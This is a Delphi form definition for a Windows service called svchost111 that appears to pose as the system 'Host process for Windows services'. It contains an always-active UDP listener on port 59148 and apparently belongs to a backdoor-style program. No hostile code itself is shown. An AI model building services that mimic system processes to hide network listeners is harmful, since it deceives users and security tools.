object svchost111: Tsvchost111
  OldCreateOrder = False
  DisplayName = '111111111111111'#1061#1086#1089#1090'-'#1087#1088#1086#1094#1077#1089#1089' '#1076#1083#1103' '#1089#1083#1091#1078#1073' Windows'
  ErrorSeverity = esIgnore
  Interactive = True
  WaitHint = 2000
  OnExecute = ServiceExecute
  Height = 150
  Width = 215
  object IdUDPServer1: TIdUDPServer
    Active = True
    Bindings = <>
    DefaultPort = 59148
    ThreadedEvent = True
    OnUDPRead = IdUDPServer1UDPRead
    Left = 96
    Top = 64
  end
end
